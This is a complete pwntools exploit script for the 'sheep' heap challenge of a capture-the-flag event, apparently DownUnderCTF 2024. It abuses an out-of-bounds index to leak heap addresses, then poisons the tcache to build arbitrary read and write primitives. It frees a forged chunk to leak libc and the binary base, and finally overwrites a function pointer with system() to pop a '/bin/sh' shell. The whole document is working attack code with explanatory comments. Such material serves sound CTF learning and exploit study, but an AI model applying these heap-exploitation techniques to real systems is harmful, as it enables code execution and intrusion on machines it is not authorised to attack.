from pwn import *

context.update(os="linux", arch="amd64")
elf = context.binary = ELF("sheep")
libc = ELF("libc.so.6")

if args.REMOTE:
	p = remote("2024.ductf.dev", 30025)
else:
	p = elf.process()
	if args.GDB:
		gdb.attach(p)
		pause()

# used to buffer the sent data after receiving all leaks to prevent timing out on the remote
pbuf = b""

def buy(type, buffer=False):
	global pbuf
	if (buffer):
		pbuf += b"1\n%d\n" % type
		return
	p.sendlineafter(b"> ", b"1")
	p.sendlineafter(b"type> ", str(type).encode())
	p.recvuntil(b"at index: ")
	idx = int(p.recvline().strip())
	return idx

def upgrade(idx, type, buffer=False):
	global pbuf
	if buffer:
		pbuf += b"2\n%d\n%d\n" % (idx, type)
		return
	p.sendlineafter(b"> ", b"2")
	p.sendlineafter(b"index> ", str(idx).encode())
	p.sendlineafter(b"type> ", str(type).encode())

def sell(idx, buffer=False):
	global pbuf
	if buffer:
		pbuf += b"3\n%d\n" % idx
		return
	p.sendlineafter(b"> ", b"3")
	p.sendlineafter(b"index> ", str(idx).encode())

def view(idx):
	p.sendlineafter(b"> ", b"4")
	p.sendlineafter(b"index> ", str(idx).encode())
	p.recvuntil(b"WPS: ")
	wps = int(p.recvline().strip())
	p.recvuntil(b"Value: ")
	value = int(p.recvline().strip())
	return (wps, value)

TCACHE_IDX = -69	# and index into game->sheep that will point to the 0x20-sized tcache head entry

# get heap leak and infinite money (game->wool)
# we need infinite money for the upgrade_sheep() calls in bitwise_build later
for i in range(20):
	buy(0)
for i in range(6, -1, -1):
	sell(i)
sell(19)	# move free_slot_hint to index 19
leak_idx = buy(0)
buy(0)	# the next pointer into game->sheep will be written out of bounds and into the sheep->value field of the first sheep chunk
heap_leak = int(view(leak_idx)[1])
heap_base = heap_leak - 0x380
log.success("heap base = " + hex(heap_base))
sell(19)	# sell the sheep whose 'value' is a 64-bit heap leak pointer to get rich! (with game->wool)

for i in range(6):	# buy some more sheep with OOB indexes to increase game->num_sheep without filling game->sheep entries
	buy(0)

for i in range(18, 6, -1):	# sell all sheep to fill the tcachebin and also add the rest to the fastbins.
	sell(i)					# also, moves free_slot_hint to index 6 at the end of the loop.

# this sheep will be allocated at index 7, and we'll overwrite the fd pointer
# of its tcache chunk later to get arbitrary values into the tcache head.
# Also, this will be allocated from tcache, so the tcache count after this will be 6.
ARB_RW_SHEEP_IDX = buy(0)

# find the largest suffix of the binary representation of 'cur' that is also a prefix of 'val'
# used to know how many bits we don't need to re-write when constructing values bit-by-bit in bitwise_build().
# This is just an optimization to reduce interactions with the server and prevent timing out.
def shared_suffix_prefix(cur, val):
	for i in range(64, 0, -1):
		cur_suf = cur & ((1 << i) - 1)
		val_pref = (val >> (64 - i)) & ((1 << i) - 1)
		if (cur_suf == val_pref):
			print("suf:", i)
			return i
	print("suf:", 0)
	return 0

# use upgrade_sheep() to construct an arbitrary value into the 'wps' field of a sheep at index 'idx'
def bitwise_build(idx, value, buffer=False):
	if buffer:
		prefix_size = 0
	else:
		current = view(idx)[0]	# if acting unbuffered, we can view the current value at 'idx' and not re-write unnecessary bits
		prefix_size = shared_suffix_prefix(current, value)
	for i in range(63 - prefix_size, -1, -1):
		if ((value >> i) & 1):
			# print("i =", i, " --> *2+1")
			upgrade(idx, 2, buffer=buffer)
			upgrade(idx, 1, buffer=buffer)
		else:
			# print("i =", i, " --> *2")
			upgrade(idx, 2, buffer=buffer)

# arbitrary write primitive
def arb_write(addr, value, buffer=False):
	sell(ARB_RW_SHEEP_IDX, buffer=buffer)	# create a new free'd tcache chunk and write its address at the head of 0x20 tcache
	bitwise_build(TCACHE_IDX, addr ^ (heap_base >> 12), buffer=buffer)	# write 'addr' (with heap PROTECT_PTR) into fd of the free chunk
	buy(0, buffer=buffer)	# allocated the chunk again to get 'addr' into the head of tcache
	bitwise_build(TCACHE_IDX, value, buffer=buffer)	# write 'value' into the sheep->wps of the sheep whose address is at the tcache head (i.e. the sheep with address 'addr')

# arb read primitive; similar implementation to arb_write
def arb_read(addr):
	sell(ARB_RW_SHEEP_IDX)	# free a tcache chunk into the head of tcache
	bitwise_build(TCACHE_IDX, addr ^ (heap_base >> 12))	# write 'addr' into the fd of the freed chunk
	buy(0)	# allocate the chunk again to get 'addr' into the head of tcache
	return view(TCACHE_IDX)	# view the wps of the sheep at address 'addr'

# write a large chunk size onto the heap that we can free.
# This chunk should not fit into tcache so that it goes into the unsorted bin and we get a libc leak.
fake_chunk = heap_base + 0xb8
arb_write(fake_chunk, 0x501)	# fake chunk-size
arb_write(heap_base + 0x280, fake_chunk + 8)	# write the address of the chunk userdata on the heap
sell(-7)	# free the fake chunk

libc.address = arb_read(fake_chunk + 8)[0] - 0x21ace0	# leak unsorted bin pointer from the freed fake chunk
log.success("libc base = " + hex(libc.address))
elf.address = arb_read(libc.address + 0x219e38)[0] - 0x40c0	# leak binary base by reading it from libc memory
log.success("elf base = " + hex(elf.address))

# from this point on, we already have all the leaks we need, so the sent payload will be deterministic,
# so we'll buffer it and send all of it at once to speed up things and not time out.

arb_write(elf.sym["abilities"] + 0x10, libc.sym["system"], buffer=True)	# write system() into 'abilities[2]'
arb_write(heap_base + 0x4e0, u64(b"/bin/sh\0"), buffer=True)	# write "/bin/sh" into a sheep chunk that now has ability 2
# game->num_sheep is less than the index of the sheep at heap_base+0x4e0, so system("/bin/sh") won't yet be triggered

# change tcache head value to prevent next allocations from overwriting "/bin/sh" string
sell(19, buffer=True)
bitwise_build(TCACHE_IDX, (heap_base + 0x1000) ^ (heap_base >> 12), buffer=True)

# buy new sheep to increase game->num_sheep and trigger the sheep with ability #2 (now system("/bin/sh"))
buy(0, buffer=True)
buy(0, buffer=True)

p.send(pbuf)	# send buffered payload

p.interactive()
